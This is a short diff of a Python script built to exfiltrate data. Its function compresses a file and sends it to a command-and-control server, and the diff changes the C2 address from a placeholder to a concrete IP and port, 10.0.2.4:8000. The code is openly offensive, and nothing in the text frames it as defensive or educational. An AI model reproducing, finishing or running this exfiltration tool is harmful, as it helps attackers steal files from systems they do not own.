@@ -15,7 +15,6 @@ import gzip
 import shutil
 
 def exfiltrate_data(file_path, c2_url):
-    # Compress and encrypt the file before exfiltration
     compressed_file_path = file_path + ".gz"
     with open(file_path, 'rb') as f_in:
         with gzip.open(compressed_file_path, 'wb') as f_out:
@@ -30,6 +29,6 @@ def exfiltrate_data(file_path, c2_url):
 
 if __name__ == "__main__":
     file_path = "/path/to/file"
-    c2_url = "http://your-c2-server.com/exfiltrate"
+    c2_url = "http://10.0.2.4:8000/exfiltrate"
     status = exfiltrate_data(file_path, c2_url)
     print(f"Exfiltration status: {status}")
